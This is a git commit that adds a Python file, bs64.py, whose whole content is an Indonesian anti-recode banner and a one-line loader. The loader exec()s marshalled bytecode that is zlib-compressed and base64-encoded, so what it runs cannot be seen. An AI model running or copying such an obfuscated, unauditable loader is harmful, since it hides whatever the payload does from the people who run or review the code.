344285817650a7876f6359a83b09d291ac3acfbd
Reza-XD <94230332+Reaper-XD@users.noreply.github.com>
2022-01-03 20:14:03 +0700

    Create bs64.py

---
+++ bs64.py
@@ -0,0 +1,6 @@
+###########################################
+####    GAK BISA RECODE KAU BANG       ####
+####    RECODE HEBAT KAU!!             ####
+###########################################
+import marshal, zlib, base64
+exec(marshal.loads(zlib.decompress(base64.b64decode("eJx9ULtOwzAULau/4hKG2lJkCVR1qMQEQizQpRsgdBPfEquxHdnuIyA+lj/hpqXQiTueY59X+jobjS7ABbNuSVjXhZjBYUwNtiW8t7YqocJE00kJIZWQ+iREjv1MAF+E6wHRGN82T5cvgnY1dfnA0c5mWTxgWq9W6GEGXZ+b4K9A83U93MwfF/P7E9yjw6VtyffIfKGEsEvwIbOv7jA32qaBllGdGtwxBAtrcAW3NpNbs9n58Bk5W+jI83sdCY1UomLop5s2a9cliUrUDA49dR1cFyklWSlhGDzU1tV0Qr4OhmTNqmnDzPi/nZ497aiWR582oElyb2Doz+JXewBZu/j4LBTfWIh96MJ6+zrMUEKxLZTeRi4n00YvQ3SYpVFKHAaoKDaYbMtLDvNAppg4H09+lFDiG15bm4Q="))))
